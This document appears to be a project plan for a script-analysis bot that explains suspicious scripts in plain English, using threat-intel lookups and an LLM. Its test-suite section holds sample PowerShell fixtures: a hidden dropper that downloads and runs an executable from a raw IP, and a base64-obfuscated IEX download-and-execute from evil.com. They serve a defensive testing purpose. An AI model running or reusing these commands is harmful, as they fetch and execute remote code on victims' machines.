# Dissect — Project Plan
### Script analysis tool: Telegram bot + Web app

---

## 0. Core Concept

Dissect is a **translation tool**, not a security tool for security people. BloodHound, Ghidra, CyberChef already exist. Dissect translates machine language (scripts) into human language (plain English) for people who are scared and confused — the IT helpdesk worker with a suspicious `.ps1` in their inbox, the small business owner whose employee forwarded something weird. Every design decision should be made for that person.

### Priority hierarchy

```
1. Does it give a correct, useful answer?        ← most important
2. Does it feel trustworthy?                     ← second
3. Is it fast?                                   ← third
4. Does it look good?                            ← last
```

### What v1 looks like
A non-technical person submits a suspicious PowerShell script via Telegram. Within 15 seconds they receive a structured analysis in plain English: what the script does, flagged suspicious behaviors cross-referenced with VirusTotal and MalwareBazaar, and a direct verdict.

### Three hard problems to acknowledge early
1. **The AI can be wrong.** Obfuscated scripts, novel malware, and edge cases will trip it up. Never overclaim certainty. Always include a disclaimer.
2. **Rate limit arithmetic.** VirusTotal: 500 req/day at 4/min. Gemini has its own ceiling. Throttle and cache from day one.
3. **Abuse potential.** Malware authors can use Dissect to test evasion. Mitigate by not exposing which exact lines triggered detection rules and by caching analysis results to avoid redundant API calls.

---

## 1. Project Structure

```
dissect/
│
├── bot/                          # Telegram bot layer
│   ├── __init__.py
│   ├── handlers.py               # Message handlers (text, file, commands)
│   ├── keyboards.py              # Inline keyboard buttons
│   └── formatter.py             # Formats analysis results into Telegram messages
│
├── core/                         # Business logic — no Telegram dependencies
│   ├── __init__.py
│   ├── extractor.py             # Pulls URLs, IPs, hashes, file paths from scripts
│   ├── obfuscation.py           # Static obfuscation detection (pre-AI)
│   ├── analyzer.py              # Orchestrates the full analysis pipeline
│   └── classifier.py           # Risk scoring logic
│
├── enrichment/                   # External API integrations
│   ├── __init__.py
│   ├── virustotal.py            # VirusTotal URL + hash lookups
│   ├── urlscan.py               # URLScan.io submissions + result fetching
│   ├── malwarebazaar.py         # Hash lookups against abuse.ch
│   ├── ipinfo.py                # IP geolocation + ASN
│   └── shodan.py                # IP fingerprinting
│
├── ai/                           # LLM integration
│   ├── __init__.py
│   ├── gemini.py                # Gemini API client
│   ├── prompts.py               # All prompts live here, versioned
│   └── parser.py                # Parses + validates JSON responses from AI
│
├── db/                           # Database layer (Turso/libSQL)
│   ├── __init__.py
│   ├── models.py                # Turso models (submissions, enrichment cache)
│   └── queries.py               # Rate limit + abuse detection queries
│
├── web/                          # Web app (Phase 4)
│   ├── static/
│   │   ├── style.css
│   │   └── app.js
│   └── templates/
│       └── index.html
│
├── tests/
│   ├── sample_scripts/
│   │   ├── benign_update.ps1
│   │   ├── malware_dropper.ps1
│   │   ├── obfuscated.bat
│   │   └── curl_downloader.sh
│   └── test_analyzer.py
│
├── config.py                     # All config + API keys (loaded from .env)
├── main.py                       # Entry point
├── requirements.txt
├── .env.example
├── .gitignore
├── README.md
└── PLAN.md
```

`core/` and `enrichment/` have zero Telegram or web dependencies. Both `bot/handlers.py` and the Phase 4 web app call `core/analyzer.py`. This separation means 90% of logic is reused across interfaces.

---

## 2. Technology Stack

### Runtime
- **Language:** Python 3.11+
- **Bot framework:** `python-telegram-bot` v21 (async-native)
- **Web framework (Phase 4):** FastAPI
- **Database:** Turso (libSQL) — SQLite-compatible, 5 GB free, no credit card required
  - Library: `libsql-client` or `sqlite3` with Turso connection string
  - **Storage optimization:** Only store metadata (hashes, timestamps, risk levels). Never store raw scripts or full analysis results.

### AI
- **Primary:** Google Gemini 2.0 Flash — free, no credit card, 1M TPM
  - Library: `google-generativeai`
- **Fallback:** Groq (Llama 3.3 70B) — free, extremely fast
  - Library: `groq`

### Enrichment APIs

| Service | What it provides | Free limit |
|---|---|---|
| VirusTotal | URL + hash reputation | 500 req/day, 4/min |
| URLScan.io | URL screenshot + DOM analysis | ~5000 req/day |
| MalwareBazaar | Hash → malware family | Unlimited (research) |
| IPInfo.io | IP → country, ASN, org | 50k/month |
| Shodan | IP → open ports, services | 1 query/sec |

### Hosting
- Railway free tier (500 hrs/month) or Render free tier
- All secrets via platform environment variables — never committed
- Turso connection string via environment variable

---

## 3. Analysis Pipeline

```
SCRIPT SUBMITTED
       │
       ▼
┌─────────────────────┐
│   INPUT VALIDATION  │
│ • Size check (<50KB)│
│ • Encoding check    │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  ANALYSIS CACHE     │   ← Check by script SHA256
│  CHECK              │
│ • Cache hit? ──────► Return cached result
│ • Cache miss?      │ (no API calls needed)
│   continue         │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│  STATIC EXTRACTION  │   ← Pure regex, no AI
│ • Extract all URLs  │
│ • Extract all IPs   │
│ • Extract file paths│
│ • Extract b64 blobs │
│ • Detect script type│
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ OBFUSCATION DETECT  │   ← Pattern matching, no AI
│ • Backtick abuse    │
│ • Char code arrays  │
│ • XOR encoding      │
│ • Reversed strings  │
│ • Base64 payloads   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────────────────────────────┐
│         PARALLEL ENRICHMENT                 │   ← asyncio.gather()
│                                             │
│  VirusTotal ──► URL reputation              │
│  VirusTotal ──► Hash reputation             │
│  URLScan    ──► URL screenshot + content    │
│  MalwareBazaar ► Hash → malware family      │
│  IPInfo     ──► IP geolocation + ASN        │
│  Shodan     ──► IP open ports               │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│              AI ANALYSIS                    │
│  Input: raw script + all enrichment data    │
│  Output: structured JSON                    │
│  Model: Gemini 2.0 Flash                    │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│           RISK SCORING                      │
│  Combines: AI risk level + VT detections    │
│  + obfuscation flags + IP reputation        │
│  Output: LOW / MEDIUM / HIGH / CRITICAL     │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│         CACHE + RESPOND                     │
│  Store result in analysis_cache (7-day TTL) │
│  Telegram: emoji-structured message         │
│  Web (Phase 4): card UI                     │
└─────────────────────────────────────────────┘
```

Enrichment runs before AI — not after. The AI's analysis is significantly stronger when it has external ground truth (e.g. "this URL was flagged by 41/70 engines") rather than having to infer reputation from code alone.

---

## 4. Prompt Engineering

### Design principles

**Separate concerns into separate prompts.** Don't ask one prompt to do everything. Use focused prompts:
- Prompt A: Analyze script behavior
- Prompt B: Synthesize enrichment data
- Prompt C: Generate final verdict

Each output is more reliable and easier to debug independently.

**Force structured JSON output.** Never parse free-form text. Always demand JSON with an exact schema. Drift is caught at parse time and can be retried automatically.

**Persona + explicit constraints.** Give the model a role AND a language ceiling. "Plain English" alone is insufficient — specify the target audience.

**Few-shot examples beat instruction length.** One concrete output example inside the prompt is worth 200 words of instruction.

---

### Main Analysis Prompt

```python
SYSTEM_PROMPT = """
You are Dissect, a cybersecurity analysis assistant.
Your job is to analyze potentially malicious scripts and explain them to non-technical users.

YOUR AUDIENCE:
- IT helpdesk workers with no scripting knowledge
- Small business owners
- Regular employees who received a suspicious file
- They are scared and need clear, direct guidance

YOUR LANGUAGE RULES:
- Never use technical jargon without immediately explaining it in the same sentence
- Write at a 10th grade reading level
- Be direct: say "this is dangerous", not "this exhibits concerning characteristics"
- When uncertain, say so clearly rather than guessing

YOUR OUTPUT:
Respond ONLY with a valid JSON object. No preamble, no markdown fences, no commentary outside the JSON.

Schema:
{
  "script_type": "PowerShell | Bash | Batch | Python | VBScript | Other",
  "summary": "2-3 sentence plain English description of what the script does overall",
  "what_it_does_steps": [
    "Step 1: plain English description of first major action",
    "Step 2: ..."
  ],
  "suspicious_behaviors": [
    {
      "behavior": "plain English description",
      "severity": "LOW | MEDIUM | HIGH | CRITICAL",
      "line_reference": "actual code snippet, max 60 chars",
      "why_suspicious": "one sentence for a non-technical person"
    }
  ],
  "benign_behaviors": [
    "plain English description of safe/normal things the script does"
  ],
  "obfuscation_detected": true | false,
  "obfuscation_details": null,
  "external_intel_summary": "plain English synthesis of enrichment API findings",
  "risk_level": "LOW | MEDIUM | HIGH | CRITICAL",
  "risk_reasoning": "2-3 sentences explaining the risk level in plain English",
  "verdict": "Starts with RUN IT SAFELY, INVESTIGATE FURTHER, or DO NOT RUN THIS. Then 2-3 sentences.",
  "confidence": "HIGH | MEDIUM | LOW",
  "confidence_reason": "one sentence — why confident or uncertain"
}
"""

def build_user_prompt(script: str, enrichment: dict, obfuscation_flags: list) -> str:
    return f"""
Analyze this script. External lookups have already been run — incorporate their findings.

=== SCRIPT ===
{script}

=== STATIC ANALYSIS ===
Obfuscation flags: {obfuscation_flags if obfuscation_flags else "None"}

=== ENRICHMENT DATA ===
{format_enrichment_for_prompt(enrichment)}

Respond with only valid JSON. No surrounding text.
"""
```

---

### Enrichment Formatter

Format enrichment results into clean readable text before passing to the AI. Do not dump raw JSON into the prompt.

```python
def format_enrichment_for_prompt(enrichment: dict) -> str:
    lines = []

    if enrichment.get("urls"):
        lines.append("URLs found in script:")
        for item in enrichment["urls"]:
            vt = item.get("virustotal", {})
            malicious = vt.get("malicious", "unknown")
            total = vt.get("total_engines", "unknown")
            lines.append(f"  - {item['url']}")
            lines.append(f"    VirusTotal: {malicious}/{total} engines flagged as malicious")
            if item.get("urlscan_verdict"):
                lines.append(f"    URLScan verdict: {item['urlscan_verdict']}")

    if enrichment.get("ips"):
        lines.append("IP addresses found in script:")
        for item in enrichment["ips"]:
            lines.append(f"  - {item['ip']}")
            lines.append(f"    Location: {item.get('country', 'unknown')}, Org: {item.get('org', 'unknown')}")
            if item.get("is_tor"):
                lines.append(f"    WARNING: Known Tor exit node")
            if item.get("shodan_ports"):
                lines.append(f"    Open ports: {item['shodan_ports']}")

    if enrichment.get("hashes"):
        lines.append("File hashes found in script:")
        for item in enrichment["hashes"]:
            lines.append(f"  - {item['hash']}")
            if item.get("malwarebazaar_family"):
                lines.append(f"    MalwareBazaar: Known malware — {item['malwarebazaar_family']}")
            else:
                lines.append(f"    MalwareBazaar: Not found in database")

    return "\n".join(lines) if lines else "No external indicators found in script."
```

---

### Obfuscation Secondary Prompt

Run as a separate focused call when `obfuscation_detected` is true.

```python
DEOBFUSCATION_PROMPT = """
You are a cybersecurity expert explaining script obfuscation to a non-technical person.

The following script is deliberately disguised to hide what it does.
Explain in plain English:
1. What technique was used to hide the code
2. What the hidden code actually does (if determinable)
3. Why obfuscation itself is a red flag

Max 150 words. No jargon. Write as if talking to a worried employee.

SCRIPT:
{script}

OBFUSCATION FLAGS:
{flags}
"""
```

---

### Prompt versioning discipline

All prompts live in `ai/prompts.py`. Comment every significant change:

```python
# v1 — initial prompt
# v2 — tightened language rules, "exhibits concerning" kept appearing
# v3 — added few-shot example after benign curl commands were over-flagged
# v4 — separated obfuscation into its own prompt for reliability
```

After each change, run all test scripts and verify: parse success rate, risk level accuracy per sample, language level, verdict directness.

---

## 5. Rate Limiting & Caching

### Daily budget (free tiers)

| Service | Daily limit | Per-minute | Strategy |
|---|---|---|---|
| VirusTotal | 500 requests | 4/min | Cache by URL/hash, 24hr TTL |
| Gemini Flash | ~1500 req (est.) | 15/min | Cache by script hash |
| URLScan | ~5000 requests | ~5/min | Submit async, fetch after 10s |
| MalwareBazaar | Unlimited | — | No special handling |
| IPInfo | ~1600/day (50k/mo) | — | Cache by IP |

### Cache pattern

```python
async def get_cached_or_fetch(cache_key: str, fetch_fn, ttl_hours=24):
    cached = await db.get_cache(cache_key)
    if cached and not is_expired(cached, ttl_hours):
        return cached.data
    result = await fetch_fn()
    await db.set_cache(cache_key, result)
    return result
```

Cache keys:
- `vt_url_{sha256_of_url}`
- `vt_hash_{sha256}`
- `mb_{sha256}`
- `ip_{ip_address}`

The same URL appearing in 100 different scripts costs one VirusTotal request.

### Analysis result caching

When a script is submitted, check if we've already analyzed the exact same script (by SHA256 hash). If yes, return the cached analysis immediately — no AI or enrichment API calls needed.

```python
async def analyze_script(script: str, user_id: str) -> dict:
    script_hash = hashlib.sha256(script.encode()).hexdigest()
    
    # Check if we've already analyzed this exact script
    cached = await db.get_analysis_cache(script_hash)
    if cached and not is_expired(cached, ttl_hours=168):  # 7-day TTL
        # Log submission but return cached result
        await db.log_submission(user_id, script_hash, cached.risk_level)
        return cached.analysis_result
    
    # Otherwise, run full pipeline
    result = await run_full_analysis(script, user_id)
    
    # Cache the result for future identical submissions
    await db.set_analysis_cache(script_hash, result, ttl_hours=168)
    
    return result
```

This means:
- **Same script submitted by 100 different users** → analyzed once, served 99 times from cache
- **Different scripts** → each analyzed independently
- **7-day TTL** → balances freshness with cost savings

---

### URLScan timeout handling

URLScan analysis can take 5-60+ seconds. Enforce an 8-second timeout to stay within the 15-second target.

```python
async def get_urlscan_results(url: str) -> dict:
    """Submit URL and fetch results with timeout. Returns partial data if timeout exceeded."""
    try:
        # Submit for analysis
        scan_id = await urlscan.submit(url)
        
        # Poll for results with 8-second total timeout
        results = await asyncio.wait_for(
            urlscan.poll_until_ready(scan_id, poll_interval=2.0),
            timeout=8.0
        )
        return {"status": "complete", "data": results}
        
    except asyncio.TimeoutError:
        # Return partial — pipeline continues without URLScan
        return {"status": "pending", "message": "Analysis still running"}
    except Exception as e:
        # Non-fatal — pipeline continues
        return {"status": "error", "message": str(e)}
```

When URLScan times out, the AI receives: *"URLScan analysis pending — verdict based on other signals."*

---

## 6. Database Schema

### Storage optimization strategy

**Goal:** Minimize storage to stay well within Turso's 5 GB free tier.

**What we store:**
- Script hashes (SHA256) — 64 chars = 64 bytes
- User IDs — Telegram ID = ~15 chars = 15 bytes
- Timestamps — 19 chars = 19 bytes
- Risk levels — 1 char = 1 byte
- Full analysis results (JSON) — cached by script hash to avoid redundant API calls
- Metadata only — no raw scripts

**What we DON'T store:**
- ❌ Raw script content (privacy + storage)
- ❌ Full enrichment API responses (rebuildable, cached separately with TTL)

**Estimated storage per row:**
```
submissions: ~150 bytes/row (with indexes)
enrichment_cache: ~2 KB/row (JSON blobs, short TTL)
analysis_cache: ~5 KB/row (full analysis JSON, cached by script hash)
```

**At 10,000 analyses/month:**
- submissions: ~1.5 MB/month
- enrichment_cache: ~20 MB (with 24hr TTL, stays bounded)
- analysis_cache: ~50 MB (unique scripts only, stays bounded)
- **Total: ~75 MB/month** → 5 GB lasts **65+ months**

---

```sql
-- Submission log (minimal metadata only)
CREATE TABLE submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT NOT NULL,
    script_hash TEXT NOT NULL,
    submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    risk_level TEXT,              -- LOW | MEDIUM | HIGH | CRITICAL
    source TEXT DEFAULT 'telegram',
    obfuscation_detected INTEGER DEFAULT 0  -- 0 or 1
);

-- Index for submission queries
CREATE INDEX idx_submissions_user_time ON submissions(user_id, submitted_at);

-- Index for abuse detection (same hash submitted multiple times)
CREATE INDEX idx_submissions_hash ON submissions(script_hash);

-- Enrichment API cache (short TTL, rebuildable)
CREATE TABLE enrichment_cache (
    cache_key TEXT PRIMARY KEY,
    data TEXT NOT NULL,              -- JSON blob, minimized
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NOT NULL
);

-- Analysis result cache (cached by script hash to avoid redundant API calls)
CREATE TABLE analysis_cache (
    script_hash TEXT PRIMARY KEY,
    analysis_result TEXT NOT NULL,   -- Full JSON from AI analysis
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NOT NULL
);

-- Index for fast cache lookups
CREATE INDEX idx_analysis_cache_hash ON analysis_cache(script_hash);
```

**Schema changes from original plan:**
- ✅ Added `analysis_cache` table — stores full analysis JSON by script hash to avoid redundant API calls
- ✅ Added `obfuscation_detected` flag — useful for abuse tracking, minimal storage
- ✅ Added indexes — fast cache queries without full table scans

---

## 6b. Deployment Considerations

### Persistent database: Turso

**Why Turso:**
- 5 GB free storage — no credit card required
- SQLite-compatible — minimal code changes (`aiosqlite` → `libsql-client`)
- No pausing — unlike Supabase free tier
- Edge-optimized — fast globally

**Setup (Phase 2):**
1. Create account at [turso.tech](https://turso.tech) — no credit card required
2. Create database: `turso db create dissect`
3. Get connection string: `turso db show dissect`
4. Create auth token: `turso db tokens create dissect`
5. Add to `.env`:
   ```
   TURSO_DATABASE_URL=libsql://your-db.turso.io
   TURSO_AUTH_TOKEN=your-token-here
   ```

**Connection setup:**
```python
# config.py
TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN")

# Use libsql-client or sqlite3 with Turso connection string
```

### Ephemeral storage fallback (Railway/Render local SQLite)

If not using Turso, the local filesystem resets on every redeploy. SQLite data is **not persistent**.

**Impact by table:**

| Table | Lost on redeploy? | Consequence |
|---|---|---|
| `submissions` | Yes | Audit trail lost — acceptable for v1 |
| `enrichment_cache` | Yes | Rebuilds on demand — acceptable |
| `analysis_cache` | Yes | **Same scripts re-analyzed on demand — acceptable but costs extra API calls** |

**Recommendation:** Use Turso from Phase 2 onwards. It's free, persistent, and eliminates the rate-limit bypass issue.

### Abuse mitigation (with Turso)

**Phase 2+ (persistent DB enabled):**

- **Hash-based submission tracking** — detect repeated submissions of same malware
- **Analysis result caching** — identical scripts served from cache (7-day TTL), no redundant API calls
- **Submission velocity checks** — flag users submitting >20 scripts/hour

```python
# Abuse detection thresholds
MAX_SUBMISSIONS_PER_HASH_PER_DAY = 10  # Detect evasion testing
MAX_SUBMISSIONS_PER_USER_PER_HOUR = 20  # Detect automated abuse
```

**v1 fallback (without Turso):** Rely on Telegram user IDs alone. Document that rate limits reset on redeploy.

---

## 7. Build Phases

### Phase 1 — Working bot, no enrichment (Week 1)
- `config.py` — key loading from `.env`, fails loudly on missing keys
- `ai/gemini.py` — Gemini client, tested in isolation first
- `ai/prompts.py` — main analysis prompt
- `ai/parser.py` — JSON parsing + validation, retry on parse failure
- `core/extractor.py` — regex extraction of URLs, IPs, hashes
- `core/obfuscation.py` — pattern-based detection
- `core/analyzer.py` — orchestration: extraction → AI → return
- `bot/handlers.py` — text message handler
- `bot/formatter.py` — JSON result → readable Telegram message
- `main.py` — entry point

**Milestone:** Bot live, responds to pasted scripts with AI analysis.

### Phase 2 — Enrichment APIs + Turso (Week 2)
- `enrichment/virustotal.py`
- `enrichment/malwarebazaar.py`
- `enrichment/ipinfo.py`
- `db/` — Turso setup, models, queries
- `config.py` — Turso connection string loading
- Wire enrichment into `core/analyzer.py` via `asyncio.gather()`
- Update prompt to include enrichment data
- Analysis result caching by script hash (7-day TTL) — identical scripts served from cache
- Hash-based abuse detection (same hash submitted >10 times/day)
- **URLScan timeout handling:** 8-second timeout, proceed without results if exceeded

**Milestone:** Full pipeline, enriched analysis, persistent caching + abuse detection.

### Phase 3 — File uploads + URLScan (Week 3)
- `enrichment/urlscan.py` — async submit + fetch with **8-second timeout**
- `bot/handlers.py` — document handler for `.ps1`, `.bat`, `.sh` uploads
- File type validation — reject binaries, accept text-based scripts only
- `enrichment/shodan.py`
- Obfuscation secondary prompt wired in
- Telegram message formatting polish

**Milestone:** Full-featured bot, ready for public sharing.

### Phase 4 — Web interface (Week 4)
- FastAPI app with `POST /analyze` endpoint
- Single-page frontend: script textarea + file drop zone
- Analysis result card with expandable sections
- ❌ **Share links removed** — full results not stored (storage optimization)
- Deploy to Railway

**Milestone:** Public URL, multi-interface access (Telegram + Web).

---

## 8. Error Handling

Every failure case returns something — the bot never goes silent.

```python
async def analyze(script: str, user_id: str) -> dict:
    result = {
        "summary": None,
        "risk_level": "UNKNOWN",
        "verdict": None,
        "errors": [],
        "enrichment": {}
    }

    # Enrichment failures are non-fatal
    try:
        vt_result = await virustotal.lookup_urls(urls)
        result["enrichment"]["virustotal"] = vt_result
    except Exception as e:
        result["errors"].append(f"VirusTotal unavailable: {str(e)}")

    # AI failure is fatal — return a useful degraded message
    try:
        ai_result = await gemini.analyze(script, result["enrichment"])
        result.update(ai_result)
    except Exception as e:
        result["verdict"] = "Analysis temporarily unavailable. Try again in a moment."
        result["errors"].append(f"AI analysis failed: {str(e)}")

    return result
```

Degraded response example:
> ⚠️ VirusTotal is rate-limited right now. Here's what I found from the script itself: ...

---

## 9. Test Suite

Required before writing any analysis logic. Four core cases:

**Benign — Windows Update checker (`benign_update.ps1`):**
```powershell
$UpdateSession = New-Object -ComObject Microsoft.Update.Session
$UpdateSearcher = $UpdateSession.CreateUpdateSearcher()
$SearchResult = $UpdateSearcher.Search("IsInstalled=0")
Write-Host "Updates available: $($SearchResult.Updates.Count)"
```

**Malicious — Dropper pattern (`malware_dropper.ps1`):**
```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
  $url = 'http://185.220.101.47/payload.exe';
  $path = $env:TEMP + '\svchost32.exe';
  (New-Object System.Net.WebClient).DownloadFile($url, $path);
  Start-Process $path
"
```

**Obfuscated — Base64 payload (`obfuscated.ps1`):**
```powershell
$encoded = 'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vcGF5bG9hZCcpCg=='
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)) | IEX
```

**Ambiguous — Legitimate installer (`ambiguous_download.ps1`):**
```powershell
$url = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe"
$output = "$env:TEMP\python_installer.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output -Args "/quiet InstallAllUsers=1" -Wait
```

These four cases should produce meaningfully different risk levels and verdicts. If they don't, the prompt needs revision.

---

## 10. README Structure

1. What is Dissect? (one paragraph)
2. Who is it for? (specific target users)
3. How does it work? (pipeline overview)
4. APIs used
5. Setup instructions
6. Screenshots: script submitted → analysis output
7. What I learned

---

*Last updated: project inception. Update as decisions change.*